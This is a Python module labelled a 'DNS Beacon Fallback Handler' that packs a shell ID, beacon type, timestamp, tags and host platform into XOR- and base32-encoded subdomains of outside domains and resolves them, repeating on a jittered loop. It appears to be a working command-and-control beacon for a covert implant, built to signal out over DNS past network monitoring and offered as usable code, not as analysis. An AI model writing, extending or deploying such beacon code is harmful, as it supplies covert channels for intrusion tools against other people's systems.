# MINC - DNS Beacon Fallback Handler (Tier 3 - Multi-Mode, Stealth+Signal)

import socket
import time
import random
import base64
import hashlib
import platform

# === CONFIG ===
DNS_SUFFIXES = [
    "alien-grid.net",
    "tracknet.org",
    "alien-zone.co",
    "beacon-link.xyz"
]

XOR_KEY = "minc"

def xor_encode(data, key=XOR_KEY):
    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))

def safe_base32_encode(data):
    b = base64.b32encode(data.encode()).decode()
    return b.lower().replace("=", "")

def random_suffix():
    return random.choice(DNS_SUFFIXES)

def get_platform_code():
    return platform.system().lower()[0:3]  # win / lin / dar / unk

def generate_dns_signal(shell_id, beacon_type="heartbeat", tags=None):
    tags = tags or ["memory"]
    nonce = str(random.randint(10000, 99999))
    ts = str(int(time.time()))[-4:]  # last 4 digits only

    raw = f"{shell_id}|{beacon_type}|{ts}|{','.join(tags)}|{get_platform_code()}"
    encrypted = xor_encode(raw)
    encoded = safe_base32_encode(encrypted)

    return f"{encoded}.{random_suffix()}"

def dns_lookup(domain):
    try:
        socket.gethostbyname(domain)
        return True
    except:
        return False

def beacon_dns(shell_id, beacon_type="heartbeat", tags=None, attempts=3, delay=3):
    for attempt in range(attempts):
        subdomain = generate_dns_signal(shell_id, beacon_type, tags)
        print(f"[dns_fallback] 🛰 DNS beacon: {subdomain}")
        if dns_lookup(subdomain):
            print(f"[dns_fallback] ✅ Beacon confirmed.")
            return True
        time.sleep(delay + random.uniform(0.2, 1.5))
    print(f"[dns_fallback] ❌ DNS beacon not acknowledged.")
    return False

def persistent_dns_loop(shell_id, tags=None, beacon_type="heartbeat", interval=180):
    while True:
        success = beacon_dns(shell_id, beacon_type=beacon_type, tags=tags, attempts=2)
        if not success:
            print(f"[dns_fallback] Silent ping mode.")
        time.sleep(interval + random.randint(-20, 20))

def test_dns_fallback(shell_id):
    print(f"[dns_fallback] 🔧 Testing fallback for {shell_id}")
    return beacon_dns(shell_id, beacon_type="test", tags=["probe", "manual"])

